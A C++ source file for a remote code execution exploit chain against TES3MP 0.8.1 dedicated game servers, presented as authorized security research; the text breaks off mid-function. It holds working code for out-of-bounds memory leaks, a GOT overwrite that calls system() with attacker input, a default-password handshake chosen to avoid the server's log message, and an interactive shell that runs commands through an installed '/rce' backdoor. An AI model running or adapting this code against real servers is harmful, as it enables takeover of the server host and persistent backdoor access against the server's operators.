// tes3mp-rce - remote code execution against TES3MP 0.8.1 dedicated servers.
//
// Authorized security research. See README.md. Runs one command on the server host as the
// server's user, by chaining an unvalidated equipment index into an info leak and a GOT overwrite.
//
//   1. leak a heap pointer            truncated ID_PLAYER_EQUIPMENT idx 25 relays chatMessage._M_p
//   2. groom                          ID_PLAYER_ANIM_PLAY parks that pointer in animation.mode|count
//   3. leak the object base           truncated idx 28 relays creatureRefId._M_p (a self-pointer)
//   4. leak the image base            arbitrary read of *(base-8) = vtable for Player + 16
//   5. leak libc                      arbitrary read of *(PIE + malloc@got)
//   6. plant                          aim eq[7].refId at strlen@got
//   7. execute                        ONE equipment packet: item 7 writes `system` into strlen@got,
//                                     item 5's refId assignment then calls the hijacked strlen on the
//                                     payload, because operator=(const char*) calls strlen on its SOURCE.
//
// Requires two client connections: A (attacker) and R (a reader in the same cell that receives the
// relayed packets carrying the leaked bytes). In a real attack these can be two separate hosts.
#include <cstdio>
#include <ctime>
#include <cstdlib>
#include <cstring>
#include <cstdint>
#include <string>
#include <vector>
#include <unistd.h>
#include <getopt.h>
#include <RakPeerInterface.h>
#include <MessageIdentifiers.h>
#include <BitStream.h>
#include <PacketPriority.h>
#include <components/openmw-mp/NetworkMessages.hpp>
using namespace RakNet;

// ---- target profile (measured on the distributed 0.8.1 linux build + Ubuntu 24.04 glibc 2.39) ----
// Everything that is true of a BUILD rather than of a run. Two halves with different origins:
// the image RVAs come from the target's ELF (public release artifact, or --server-bin), and the
// layout constants come from its C++ class layout, which no ELF records. tools/gen-profile derives
// the second half from the headers; --profile loads either half from a file.
struct Profile {
    uint64_t vtable_rva;   // "vtable for Player + 16", i.e. the value stored at Player+0
    uint64_t strlen_got;   // .got.plt slot for strlen  (the hijack target)
    uint64_t malloc_got;   // .got.plt slot for malloc  (non-IFUNC: safe for deriving the libc base)
    uint64_t malloc_off;   // malloc offset within libc  (only used with --malloc-off/--libc)
    uint64_t system_off;   // system offset within libc  (only used with --system-off/--libc)
    // --- class layout. Not derivable from the ELF; see tools/gen-profile.cc. ---
    uint64_t equip_off;      // offsetof(BasePlayer, equipmentItems)
    uint64_t item_stride;    // sizeof(mwmp::Item)
    uint64_t item_count_off; // offsetof(Item, count), where the OOB read/write lands
    uint64_t leak_heap_idx;  // index whose count|charge overlaps chatMessage._M_p
    uint64_t leak_self_idx;  // index whose count|charge overlaps creatureRefId._M_p (a self-pointer)
    uint64_t self_ptr_delta; // offsetof(BasePlayer, creatureRefId) + 16 (its SSO buffer)
};
static Profile P = { 0x2b5f90, 0x2c31f8, 0x2c3660, 0xad750, 0x58750,
                     0xe00, 80, 32, 25, 28, 0x16f0 };

// A profile is `key = value` lines, # comments, blanks ignored. Unknown keys are reported rather
// than skipped: a typo in a hand-edited profile that silently keeps a baked-in default is the
// same class of failure as the constants it replaces.
static bool loadProfile(const char *path)
{
    FILE *f = fopen(path, "r");
    if (!f) { perror(path); return false; }
    struct { const char *k; uint64_t *v; } tab[] = {
        {"vtable_rva", &P.vtable_rva}, {"strlen_got", &P.strlen_got}, {"malloc_got", &P.malloc_got},
        {"malloc_off", &P.malloc_off}, {"system_off", &P.system_off},
        {"equip_off", &P.equip_off}, {"item_stride", &P.item_stride},
        {"item_count_off", &P.item_count_off}, {"leak_heap_idx", &P.leak_heap_idx},
        {"leak_self_idx", &P.leak_self_idx}, {"self_ptr_delta", &P.self_ptr_delta},
    };
    char line[512]; int n = 0; bool ok = true;
    while (fgets(line, sizeof line, f)) {
        char *h = strchr(line, '#'); if (h) *h = 0;
        char *eq = strchr(line, '='); if (!eq) continue;
        *eq = 0;
        char key[128] = {0}; if (sscanf(line, " %127s", key) != 1) continue;
        // Informational keys gen-profile emits that are not addresses.
        if (!strcmp(key, "name") || !strcmp(key, "token") || !strcmp(key, "scratch_field") ||
            !strcmp(key, "groom_off") || !strcmp(key, "libc")) continue;
        bool hit = false;
        for (auto &t : tab)
            if (!strcmp(key, t.k)) { *t.v = strtoull(eq + 1, 0, 0); n++; hit = true; break; }
        if (!hit) { fprintf(stderr, "%s: unknown key '%s'\n", path, key); ok = false; }
    }
    fclose(f);
    if (!ok) { fprintf(stderr, "%s: refusing to run on a profile I do not fully understand.\n", path); return false; }
    printf("[*] profile %s: %d values loaded\n", path, n);
    return true;
}

// Read malloc/system offsets straight out of a copy of the TARGET's libc.so.6. glibc patch builds shift
// symbol offsets, so the baked-in defaults only match the exact build they were measured on. Minimal ELF64
// parse (macOS has no <elf.h>): walk section headers for .dynsym, match symbol names in its linked strtab.
struct E64Ehdr { unsigned char e_ident[16]; uint16_t e_type, e_machine; uint32_t e_version;
                 uint64_t e_entry, e_phoff, e_shoff; uint32_t e_flags;
                 uint16_t e_ehsize, e_phentsize, e_phnum, e_shentsize, e_shnum, e_shstrndx; };
struct E64Shdr { uint32_t sh_name, sh_type; uint64_t sh_flags, sh_addr, sh_offset, sh_size;
                 uint32_t sh_link, sh_info; uint64_t sh_addralign, sh_entsize; };
struct E64Sym  { uint32_t st_name; unsigned char st_info, st_other; uint16_t st_shndx;
                 uint64_t st_value, st_size; };

static bool readLibcOffsets(const char *path, uint64_t &malloc_off, uint64_t &system_off)
{
    FILE *f = fopen(path, "rb"); if (!f) { perror(path); return false; }
    fseek(f, 0, SEEK_END); long n = ftell(f); fseek(f, 0, SEEK_SET);
    std::vector<char> buf(n > 0 ? n : 0);
    if (n < 64 || fread(buf.data(), 1, n, f) != (size_t)n) { fclose(f); fprintf(stderr, "%s: short read\n", path); return false; }
    fclose(f);
    if (memcmp(buf.data(), "\x7f""ELF", 4) != 0 || (unsigned char)buf[4] != 2) { fprintf(stderr, "%s: not a 64-bit ELF\n", path); return false; }
    E64Ehdr *eh = (E64Ehdr *)buf.data();
    if (eh->e_shoff == 0 || eh->e_shoff + (uint64_t)eh->e_shnum * sizeof(E64Shdr) > (uint64_t)n) return false;
    E64Shdr *sh = (E64Shdr *)(buf.data() + eh->e_shoff);
    bool gotM = false, gotS = false;
    for (int i = 0; i < eh->e_shnum; i++) {
        if (sh[i].sh_type != 11 /*SHT_DYNSYM*/ || sh[i].sh_entsize == 0) continue;
        E64Sym *sym = (E64Sym *)(buf.data() + sh[i].sh_offset);
        long cnt = sh[i].sh_size / sizeof(E64Sym);
        const char *str = buf.data() + sh[sh[i].sh_link].sh_offset;
        for (long k = 0; k < cnt; k++) {
            if (!sym[k].st_value) continue;                       // skip UND imports
            const char *nm = str + sym[k].st_name;
            if (!strcmp(nm, "malloc")) { malloc_off = sym[k].st_value; gotM = true; }
            else if (!strcmp(nm, "system")) { system_off = sym[k].st_value; gotS = true; }
        }
    }
    if (!gotM || !gotS) fprintf(stderr, "%s: could not find %s%s%s in .dynsym\n", path,
                                gotM ? "" : "malloc", (!gotM && !gotS) ? " and " : "", gotS ? "" : "system");
    return gotM && gotS;
}

struct E64Rela { uint64_t r_offset, r_info; int64_t r_addend; };
struct E64Phdr { uint32_t p_type, p_flags; uint64_t p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_align; };
struct E64Dyn  { int64_t d_tag; uint64_t d_val; };

// Derive the three server-binary RVAs from the target's own tes3mp-server.x86_64: the strlen and malloc
// GOT slots from the JUMP_SLOT relocations, and the Player vtable address-point from the (unstripped)
// symbol table. Nothing is then hardcoded: hand it the two target files and every address is read out.
static bool readServerBin(const char *path, uint64_t &vt, uint64_t &sgot, uint64_t &mgot)
{
    FILE *f = fopen(path, "rb"); if (!f) { perror(path); return false; }
    fseek(f, 0, SEEK_END); long n = ftell(f); fseek(f, 0, SEEK_SET);
    std::vector<char> buf(n > 0 ? n : 0);
    if (n < 64 || fread(buf.data(), 1, n, f) != (size_t)n) { fclose(f); fprintf(stderr, "%s: short read\n", path); return false; }
    fclose(f);
    if (memcmp(buf.data(), "\x7f""ELF", 4) != 0 || (unsigned char)buf[4] != 2) { fprintf(stderr, "%s: not a 64-bit ELF\n", path); return false; }
    E64Ehdr *eh = (E64Ehdr *)buf.data();
    if (eh->e_shoff == 0 || eh->e_shoff + (uint64_t)eh->e_shnum * sizeof(E64Shdr) > (uint64_t)n) return false;
    E64Shdr *sh = (E64Shdr *)(buf.data() + eh->e_shoff);

    // ---- structural preconditions, checked FIRST -------------------------------------------
    // Both are properties of how the target was BUILT, and both make the chain impossible rather
    // than unreliable, so they are worth a clear refusal here instead of a confusing failure at
    // step 7. They are also checked before the symbol scan, because "this build can never work"
    // is more useful than "I could not find a symbol in a build that could never have worked".

    // Full RELRO. TES3MP's CMakeLists sets no hardening flags at all (only -Wall -Wextra -Wundef
    // -pedantic), so a self-built server inherits whatever its distro's gcc and binutils specs
    // give it. If GNU_RELRO covers .got.plt the loader maps it read-only before main and step 7
    // faults. The shipped 0.8.1 release is PARTIAL RELRO: GNU_RELRO ends exactly where .got.plt
    // begins, which is the only reason this chain exists.
    if (eh->e_shstrndx < eh->e_shnum && eh->e_phoff &&
        eh->e_phoff + (uint64_t)eh->e_phnum * sizeof(E64Phdr) <= (uint64_t)n) {
        // BIND_NOW is the authoritative signal and must be checked FIRST, because a full-RELRO
        // link often leaves no .got.plt section to test at all: with eager binding there are no
        // lazy PLT slots, so the linker folds what remains into .got under GNU_RELRO. Measured on
        // the fuzz pool 2026-08-23: Ubuntu 24.04 with g++ 13 produces GNU_RELRO + BIND_NOW and
        // ZERO .got.plt sections, so a containment test alone silently passes the exact build
        // most likely to defeat this chain. Debian 12 with g++ 12 produces partial RELRO and a
        // writable .got.plt, i.e. a self-built server is immune on one and exposed on the other.
        for (int i = 0; i < eh->e_shnum; i++) {
            if (sh[i].sh_type != 6 /*SHT_DYNAMIC*/ || sh[i].sh_entsize == 0) continue;
            E64Dyn *dy = (E64Dyn *)(buf.data() + sh[i].sh_offset);
            long dn = sh[i].sh_size / sizeof(E64Dyn);
            for (long k = 0; k < dn && dy[k].d_tag; k++) {
                bool now = (dy[k].d_tag == 24)                                  // DT_BIND_NOW
                        || (dy[k].d_tag == 30       && (dy[k].d_val & 0x8))     // DT_FLAGS   & DF_BIND_NOW
                        || (dy[k].d_tag == 0x6ffffffb && (dy[k].d_val & 0x1));  // DT_FLAGS_1 & DF_1_NOW
                if (!now) continue;
                fprintf(stderr, "%s: FULL RELRO (BIND_NOW)\n"
                        "    The loader resolves every PLT slot before main and then maps the GOT read-only,\n"
                        "    so the step-7 overwrite faults. This chain cannot work against this build.\n"
                        "    Measured for reference: a plain `g++ -O2` on Ubuntu 24.04 (g++ 13) produces this;\n"
                        "    the same command on Debian 12 (g++ 12) does not. It is a distro toolchain\n"
                        "    default, not a choice anyone made.\n", path);
                return false;
            }
        }
        const char *shstr = buf.data() + sh[eh->e_shstrndx].sh_offset;
        uint64_t gotplt = 0, gotpltsz = 0;
        for (int i = 0; i < eh->e_shnum; i++)
            if (!strcmp(shstr + sh[i].sh_name, ".got.plt")) { gotplt = sh[i].sh_addr; gotpltsz = sh[i].sh_size; }
        if (gotplt) {
            E64Phdr *ph = (E64Phdr *)(buf.data() + eh->e_phoff);
            for (int i = 0; i < eh->e_phnum; i++) {
                if (ph[i].p_type != 0x6474e552 /*PT_GNU_RELRO*/) continue;
                if (gotplt >= ph[i].p_vaddr && gotplt < ph[i].p_vaddr + ph[i].p_memsz) {
                    fprintf(stderr, "%s: FULL RELRO\n"
                            "    .got.plt [%#llx,%#llx) lies inside GNU_RELRO [%#llx,%#llx), so the loader maps\n"
                            "    it read-only before main and the step-7 GOT overwrite faults.\n"
                            "    This chain cannot work against this build. That is a property of the build,\n"
                            "    not a misconfiguration on your side.\n",
                            path, (unsigned long long)gotplt, (unsigned long long)(gotplt + gotpltsz),
                            (unsigned long long)ph[i].p_vaddr,
                            (unsigned long long)(ph[i].p_vaddr + ph[i].p_memsz));
                    return false;
                }
            }
        }
    }

    // std::string ABI. Every fake object the chain plants is the libstdc++ C++11 layout: _M_p at
    // +0, _M_string_length at +8, capacity/SSO buffer at +16. libc++ lays those out differently,
    // so the plants would corrupt the wrong fields. CMakeLists:582 adds -stdlib=libc++ whenever
    // the compiler is Clang, so this is a live case rather than a hypothetical.
    {
        bool cxx11 = false, libcpp = false;
        for (int i = 0; i < eh->e_shnum && !(cxx11 && libcpp); i++) {
            if (sh[i].sh_type != 2 && sh[i].sh_type != 11) continue;
            if (sh[i].sh_entsize == 0 || sh[i].sh_link >= eh->e_shnum) continue;
            E64Sym *sym = (E64Sym *)(buf.data() + sh[i].sh_offset);
            long cnt = sh[i].sh_size / sizeof(E64Sym);
            const char *str = buf.data() + sh[sh[i].sh_link].sh_offset;
            for (long k = 0; k < cnt; k++) {
                const char *nm = str + sym[k].st_name;
                if (!cxx11  && strstr(nm, "_ZNSt7__cxx11")) cxx11 = true;
                if (!libcpp && strstr(nm, "_ZNSt3__1"))     libcpp = true;
            }
        }
        if (libcpp && !cxx11) {
            fprintf(stderr, "%s: built against libc++ (_ZNSt3__1 mangling), not libstdc++\n"
                    "    Every plant in this chain assumes the libstdc++ C++11 std::string layout\n"
                    "    (_M_p +0, length +8, capacity +16). libc++ differs, so the chain would write\n"
                    "    through the wrong fields. Use a libstdc++ target, or re-derive the layout.\n", path);
            return false;
        }
    }

    bool gS = false, gM = false, gV = false;
    // GOT slots from JUMP_SLOT relocations (R_X86_64_JUMP_SLOT == 7)
    for (int i = 0; i < eh->e_shnum && !(gS && gM); i++) {
        if (sh[i].sh_type != 4 /*SHT_RELA*/ || sh[i].sh_entsize == 0) continue;
        E64Rela *r = (E64Rela *)(buf.data() + sh[i].sh_offset);
        long cnt = sh[i].sh_size / sizeof(E64Rela);
        E64Shdr &ds = sh[sh[i].sh_link];
        E64Sym *sym = (E64Sym *)(buf.data() + ds.sh_offset);
        const char *str = buf.data() + sh[ds.sh_link].sh_offset;
        for (long k = 0; k < cnt; k++) {
            if ((r[k].r_info & 0xffffffff) != 7) continue;
            const char *nm = str + sym[r[k].r_info >> 32].st_name;
            if (!strcmp(nm, "strlen")) { sgot = r[k].r_offset; gS = true; }
            else if (!strcmp(nm, "malloc")) { mgot = r[k].r_offset; gM = true; }
        }
    }
    // Player vtable address-point (symbol value + 16, past offset-to-top and the typeinfo pointer)
    for (int i = 0; i < eh->e_shnum && !gV; i++) {
        if (sh[i].sh_type != 2 /*SHT_SYMTAB*/ && sh[i].sh_type != 11 /*SHT_DYNSYM*/) continue;
        E64Sym *sym = (E64Sym *)(buf.data() + sh[i].sh_offset);
        long cnt = sh[i].sh_size / sizeof(E64Sym);
        const char *str = buf.data() + sh[sh[i].sh_link].sh_offset;
        // "vtable for Player": the server's Player is in the global namespace (class Player : mwmp::BasePlayer),
        // so _ZTV6Player; accept the mwmp-namespaced mangling too in case a fork moves it.
        for (long k = 0; k < cnt; k++) {
            if (!sym[k].st_value) continue;
            const char *nm = str + sym[k].st_name;
            if (!strcmp(nm, "_ZTV6Player") || !strcmp(nm, "_ZTVN4mwmp6PlayerE")) { vt = sym[k].st_value + 16; gV = true; break; }
        }
    }
    if (!gS || !gM) fprintf(stderr, "%s: missing strlen/malloc JUMP_SLOT relocations\n", path);
    if (!gV) fprintf(stderr, "%s: no _ZTV6Player vtable symbol\n"
                             "    The binary is stripped. Step 4 turns the leaked Player vptr into an image base by\n"
                             "    subtracting this RVA, so without it there is nothing to subtract. Pass the\n"
                             "    unstripped release binary.\n", path);
    return gS && gM && gV;
}

struct D12 { uint32_t a, b, c; };
struct CellData12 { int mFlags, mX, mY; };
struct Pos3 { float p[3]; };
struct Cli { RakPeerInterface *peer; SystemAddress srv; };

static const char *g_host = "127.0.0.1";
static int g_port = 25565;
static const char *g_token = "0.8.11068954091c54d0596037c4fb54d2812313b7582a1"; // TES3MP_VERSION+PROTO+commitHash
// TES3MP_DEFAULT_PASSW. Networking.cpp:84 substitutes this when the admin leaves `password`
// empty, so sending "" against a default server MISMATCHES and logs
//   "Client at %s tried to join using password, despite the server not being passworded"
// once per client, twice per run (Networking.cpp:127-129). It is still admitted, because the
// not-passworded branch falls through to setHandshake(), so the exploit worked while announcing
// itself in the log every time. Sending the real default matches and is silent.
static const char *g_srvpass = "blankpassword";  // ID_SYSTEM_HANDSHAKE field 2. NOT a user account.
static int g_verbose = 0;
// The relayed packets that carry leaked bytes are OURS. Every equipment relay in the cell used to
// be accepted, so any other player changing equipment fed their bytes into the leak. Set once from
// client A after connect; harvest()/harvestFull() drop anything else.
static RakNetGUID g_srcGuid;
static bool g_srcKnown = false;
static unsigned long g_foreign = 0;   // relays dropped as not-ours, reported at the end
static int g_probe = 0;   // connect both clients, reach POSTLOADED, report, and STOP (touches no memory)
static std::vector<std::pair<std::string, unsigned>> g_files = {{"Morrowind.esm", 0x7B6AF5B9u}};

static void vlog(const char *f, ...) { if (!g_verbose) return; va_list a; va_start(a, f); vfprintf(stderr, f, a); va_end(a); }

static void snd(Cli &c, BitStream &bs) { c.peer->Send(&bs, HIGH_PRIORITY, RELIABLE_ORDERED, 0, c.srv, false); }
static void hdr(Cli &c, BitStream &bs, unsigned char id) { bs.Write(id); RakNetGUID g = c.peer->GetMyGUID(); bs.Write(g); }

// Build every RakString from bytes, never from the constructor.
//
// RakString(const char *format, ...) is printf-style: it forwards to _vsnprintf(buf, 512, str, ap)
// (RakString.cpp, Assign(const char*, va_list)). So a '%' anywhere in the data is read as a conversion
// specifier and vsnprintf consumes a vararg that was never passed, i.e. CWE-134 against ourselves. This is
// not hypothetical in either direction: shell payloads contain '%' routinely ("printf %s ..."), and the raw
// pointer bytes we serialize are '%' whenever a byte happens to be 0x25, which silently corrupts roughly one
// run in forty. AppendBytes is the plain, non-format path and takes an explicit length.
static RakString rstr(const char *s, size_t n) { RakString r; if (s && n) r.AppendBytes(s, (unsigned)n); return r; }
static RakString rstr(const char *s) { return rstr(s, s ? strlen(s) : 0); }

static bool connectTo(Cli &c, const char *bind)
{
    c.peer = RakPeerInterface::GetInstance();
    SocketDescriptor sd(0, bind);
    c.peer->Startup(1, &sd, 1);
    if (c.peer->Connect(g_host, (unsigned short)g_port, g_token, (int)strlen(g_token)) != CONNECTION_ATTEMPT_STARTED)
        return false;
    for (int i = 0; i < 300; i++) {
        for (Packet *q = c.peer->Receive(); q; c.peer->DeallocatePacket(q), q = c.peer->Receive())
            if (q->data[0] == ID_CONNECTION_REQUEST_ACCEPTED) { c.srv = q->systemAddress; return true; }
        usleep(20000);
    }
    return false;
}

// Ask the server which data files it requires, so ID_GAME_PREINIT is accepted.
static void fingerprint()
{
    Cli p{};
    if (!connectTo(p, "")) return;
    { BitStream bs; hdr(p, bs, ID_GAME_PREINIT); uint32_t n = 1; bs.Write(n);
      struct NAS { uint32_t h, s; }; NAS q{1, 13}; bs.Write(q);
      RakString rs("__probe__.esm"); bs.Write(rs); unsigned v = 0xDEADBEEFu; bs.Write(v); snd(p, bs); }
    for (int i = 0; i < 120; i++) {
        for (Packet *q = p.peer->Receive(); q; p.peer->DeallocatePacket(q), q = p.peer->Receive()) {
            if (q->data[0] != ID_GAME_PREINIT || q->length < 16) continue;
            BitStream rd(q->data, q->length, false);
            unsigned char id; rd.Read(id); RakNetGUID g; rd.Read(g);
            uint32_t n = 0; rd.Read(n); if (!n || n > 512) continue;
            struct NAS { uint32_t h, s; }; std::vector<NAS> nas(n);
            for (uint32_t k = 0; k < n; k++) rd.Read(nas[k]);
            std::vector<std::pair<std::string, unsigned>> got;
            for (uint32_t k = 0; k < n; k++) {
                RakString rs; rd.Read(rs); unsigned f = 0;
                for (uint32_t h = 0; h < nas[k].h; h++) { unsigned v = 0; rd.Read(v); if (!h) f = v; }
                got.push_back({rs.C_String(), f});
            }
            g_files.swap(got);
            printf("[+] fingerprinted %u required data files\n", n);
            RakPeerInterface::DestroyInstance(p.peer);
            return;
        }
        usleep(50000);
    }
    RakPeerInterface::DestroyInstance(p.peer);
}

// PREINIT -> SYSTEM_HANDSHAKE (name + SERVER PASSWORD) -> BASEINFO -> LOADED == POSTLOADED.
// No account, no registration, no login: account auth lives in CoreScripts and is never consulted here.
static void handshake(Cli &c, const char *name)
{
    { BitStream bs; hdr(c, bs, ID_GAME_PREINIT); uint32_t n = g_files.size(); bs.Write(n);
      struct NAS { uint32_t h, s; };
      for (auto &f : g_files) { NAS q{1, (uint32_t)f.first.size()}; bs.Write(q); }
      for (auto &f : g_files) { RakString rs = rstr(f.first.c_str()); bs.Write(rs); unsigned h = f.second; bs.Write(h); }
      snd(c, bs); } usleep(250000);
    { BitStream bs; hdr(c, bs, ID_SYSTEM_HANDSHAKE);
      RakString pn = rstr(name), pw = rstr(g_srvpass);
      RakString::SerializeCompressed(pn.C_String(), &bs);
      RakString::SerializeCompressed(pw.C_String(), &bs);   // <-- the server password goes here
      snd(c, bs); } usleep(250000);
    { BitStream bs; hdr(c, bs, ID_PLAYER_BASEINFO);
      RakString nm = rstr(name), m(""), r("Dark Elf"), h(""), hd("");
      RakString::SerializeCompressed(nm.C_String(), &bs); RakString::SerializeCompressed(m.C_String(), &bs);
      RakString::SerializeCompressed(r.C_String(), &bs);  RakString::SerializeCompressed(h.C_String(), &bs);
      RakString::SerializeCompressed(hd.C_String(), &bs);
      int mf = 0; bs.Write(mf); RakString bsn(""); RakString::SerializeCompressed(bsn.C_String(), &bs);
      bool rs = false; bs.Write(rs); snd(c, bs); } usleep(300000);
    { BitStream bs; hdr(c, bs, ID_LOADED); snd(c, bs); } usleep(400000);
}

// A wrong server password gets us kicked at ID_SYSTEM_HANDSHAKE, before setHandshake(), and every packet
// below is gated on isHandshaked(). Detect that rather than reporting a false success.
static bool stillConnected(Cli &c)
{
    for (Packet *p = c.peer->Receive(); p; c.peer->DeallocatePacket(p), p = c.peer->Receive());
    return c.peer->GetConnectionState(c.srv) == IS_CONNECTED;
}

static void loadCell(Cli &c, const char *cn)
{
    BitStream bs; hdr(c, bs, ID_PLAYER_CELL_STATE);
    uint32_t cnt = 1; bs.Write(cnt); int t = 0; bs.Write(t);
    D12 d{1, 0, 0}; bs.WriteCompressed(d);
    RakString rc = rstr(cn); RakString::SerializeCompressed(rc.C_String(), &bs);
    snd(c, bs); usleep(300000);
}

// PacketChatMessage uses the NON-compressed RakString path.
static void sendChatBytes(Cli &c, const void *p, size_t n)
{
    BitStream bs; hdr(c, bs, ID_CHAT_MESSAGE);
    RakString rs; rs.AppendBytes((const char *)p, (unsigned)n);
    bs.Write(rs); snd(c, bs); usleep(120000);
}
static void sendChatStr(Cli &c, const std::string &s) { sendChatBytes(c, s.data(), s.size()); }

// ---- interactive shell over the installed Lua /rce backdoor: log in a throwaway account, chat in/out ----
// Answer the server's PasswordDialog (register on first use, log in after), then send "/rce <cmd>" as chat
// and read the command output back as server chat messages. No memory corruption here; the backdoor is
// already installed by the exploit, and this is an ordinary game client driving it.
static void guiRespond(Cli &c, int id, int type, const char *data)
{
    BitStream bs; hdr(c, bs, ID_GUI_MESSAGEBOX);
    bs.Write(id); bs.Write(type);                                        // echo the server's dialog id (avoids the banlist trap)
    RakString label(""); bs.Write(label);                               // RW(label, send)
    RakString d = rstr(data); RakString::SerializeCompressed(d.C_String(), &bs); // RW(data, send, true) -> the password
    RakString note(""); bs.Write(note);                                 // RW(note, send)
    snd(c, bs); usleep(120000);
}

static bool readChat(Cli &c, int ms, std::string &out)
{
    bool got = false;
    for (int i = 0; i < ms / 20; i++) {
        for (Packet *p = c.peer->Receive(); p; c.peer->DeallocatePacket(p), p = c.peer->Receive()) {
            if (p->data[0] != ID_CHAT_MESSAGE) continue;
            BitStream rd(p->data, p->length, false);
            unsigned char id; rd.Read(id); RakNetGUID g; rd.Read(g);
            RakString rs; rd.Read(rs);
            out += rs.C_String(); got = true;
        }
        usleep(20000);
    }
    return got;
}

// Re-entry path. Deliberately shares nothing with the exploit: this is an ordinary client that
// connects, registers/logs in an account, and uses the already-installed command hook. It touches
// no server memory, so it works after a restart and can be run repeatedly without re-exploiting.
//
// It does need an ACCOUNT, unlike the exploit chain, because CoreScripts gates OnPlayerSendMessage
// on IsLoggedIn() (eventHandler.lua:830) and command hooks dispatch from that callback. Registering
// leaves a player file on the target (data/player/<name>.json) - state the exploit path never creates.
//
// oneShot != 0 runs a single command and exits, so the deploy tooling can verify itself without
// driving stdin.
// --bot: an ordinary client that sits in a cell and generates the traffic a real player would.
//
// WHY THIS EXISTS. The single most important fix in the correctness pass is that harvest() and
// harvestFull() now drop relayed equipment packets that are not ours. Before, ANY player changing
// equipment in the cell had their inventory parsed as our leaked pointer. That fix could not be
// tested, because testing it needs a second client producing exactly that traffic, and every other
// client in this tool is either the attacker or the reader.
//
// It sends IN-BOUNDS equipment changes only (index 0..18). This is a load generator, not a second
// exploit: it must be able to run against a server nobody minds it touching, and it must produce
// the same relay shape a real player produces or it proves nothing about the filter.
static int runBot(const char *name, const char *cell, int intervalMs, int equipIdx)
{
    Cli B{};
    if (!connectTo(B, "")) { printf("[bot] could not connect\n"); return 1; }
    handshake(B, name);
    if (!stillConnected(B)) { printf("[bot] kicked during handshake (server password?)\n"); return 4; }
    loadCell(B, cell);
    printf("[bot] %s in %s, in-bounds equipment index %d every %d ms. ctrl-C to stop.\n",
           name, cell, equipIdx, intervalMs);
    for (unsigned long n = 1;; n++) {
        { BitStream bs; hdr(B, bs, ID_PLAYER_EQUIPMENT);
          bs.Write(false); uint32_t cnt = 1; bs.Write(cnt);
          int idx = equipIdx; bs.Write(idx);
          char rid[64]; snprintf(rid, sizeof rid, "bot_%s_%lu", name, n);
          RakString r = rstr(rid); RakString::SerializeCompressed(r.C_String(), &bs);
          int c1 = (int)n, c2 = 0; float ec = 0; bs.Write(c1); bs.Write(c2); bs.Write(ec);
          snd(B, bs); }
        for (Packet *p = B.peer->Receive(); p; B.peer->DeallocatePacket(p), p = B.peer->Receive());
        if (!stillConnected(B)) { printf("[bot] disconnected after %lu sends\n", n); return 1; }
        if (g_verbose && n % 10 == 0) fprintf(stderr, "[bot] %lu sends\n", n);
        usleep(intervalMs * 1000);
    }
}

static int runShell(const char *name, const char *acctPass, const char *oneShot)
{
    Cli A{};
    if (!connectTo(A, "")) { printf("[!] could not connect (server password / reachability)\n"); return 1; }
    handshake(A, name);
    printf("[*] authenticating account '%s' (registers on first use, logs in after)...\n", name);
    bool authed = false;
    for (int i = 0; i < 300 && !authed; i++) {
        for (Packet *p = A.peer->Receive(); p; A.peer->DeallocatePacket(p), p = A.peer->Receive()) {
            if (g_verbose) fprintf(stderr, "[pkt] id=%d len=%d\n", p->data[0], p->length);
            if (p->data[0] == ID_GUI_MESSAGEBOX) {
                BitStream rd(p->data, p->length, false);
                unsigned char id; rd.Read(id); RakNetGUID g; rd.Read(g);
                int gid = 0, gtype = 0; rd.Read(gid); rd.Read(gtype);
                if (g_verbose) fprintf(stderr, "[gui] id=%d type=%d\n", gid, gtype);
                if (gid == 1 || gid == 2) guiRespond(A, gid, gtype, acctPass);  // LOGIN or REGISTER dialog (echo id)
            } else if (p->data[0] == ID_CHAT_MESSAGE) {
                BitStream rd(p->data, p->length, false);
                unsigned char id; rd.Read(id); RakNetGUID g; rd.Read(g);
                RakString rs; rd.Read(rs); std::string m = rs.C_String();
                if (g_verbose) fprintf(stderr, "[chat] \"%s\"\n", m.c_str());
                if (m.find("successfully") != std::string::npos) { authed = true; printf("[+] %s", m.c_str()); if (!m.empty() && m.back() != '\n') printf("\n"); }
            }
        }
        usleep(50000);
    }
    if (!authed) { printf("[!] login did not complete. Wrong password for an existing account, or the server rejected it.\n"); return 1; }
    std::string banner; readChat(A, 500, banner);

    if (oneShot) {
        std::string out;
        sendChatStr(A, std::string("/rce ") + oneShot);
        readChat(A, 3000, out);
        // Distinguish "hook ran" from "hook absent". CoreScripts answers an unknown command with its
        // own chat line, which is non-empty, so an emptiness check alone reports success on a clean
        // server. Caught by running this against a server whose hook had just been removed.
        if (out.empty()) { printf("[!] no response - server did not answer\n"); return 1; }
        if (out.find("Not a valid command") != std::string::npos) {
            printf("[!] hook NOT present: server rejected /rce as an unknown command\n"); return 1;
        }
        fputs(out.c_str(), stdout); if (out.back() != '\n') printf("\n");
        return 0;
    }

    printf("[*] shell ready. commands run as the server user via the /rce backdoor. ctrl-D to exit.\n\n");
    char line[8192];
    for (;;) {
        printf("prod$ "); fflush(stdout);
        if (!fgets(line, sizeof line, stdin)) { printf("\n"); break; }
        size_t n = strlen(line); while (n && (line[n-1] == '\n' || line[n-1] == '\r')) line[--n] = 0;
        if (!n) continue;
        std::string out;
        sendChatStr(A, std::string("/rce ") + line);
        readChat(A, 3000, out);
        if (out.empty()) printf("[no response]\n");
        else { fputs(out.c_str(), stdout); if (out.back() != '\n') printf("\n"); }
    }
    return 0;
}

// The OOB write: equipment index 25 lands count|charge on chatMessage._M_p, so this aims the next
// chat message's bytes at an arbitrary address.
static void redirect(Cli &c, uint64_t val)
{
    BitStream bs; hdr(c, bs, ID_PLAYER_EQUIPMENT);
    bs.Write(false); uint32_t cnt = 1; bs.Write(cnt); int idx = (int)P.leak_heap_idx; bs.Write(idx);
    RakString rid(""); RakString::SerializeCompressed(rid.C_String(), &bs);
    int lo = (int)(val & 0xffffffff), hi = (int)(val >> 32), e = 0;
    bs.Write(lo); bs.Write(hi); bs.Write(e); snd(c, bs); usleep(120000);
}

// Truncate the packet before `count`: RW() fails, its return value is discarded, and the server
// relays eq[idx].count|charge unmodified -> an out-of-bounds read straight onto the wire.
static void truncEq(Cli &c, int idx)
{
    BitStream bs; hdr(c, bs, ID_PLAYER_EQUIPMENT);
    bs.Write(false); uint32_t cnt = 1; bs.Write(cnt); bs.Write(idx);
    snd(c, bs); usleep(150000);
}

static uint64_t harvest(Cli &R, int &oi)
{
    uint64_t w = 0; oi = -1;
    for (int i = 0; i < 60 && !w; i++) {
        for (Packet *p = R.peer->Receive(); p; R.peer->DeallocatePacket(p), p = R.peer->Receive()) {
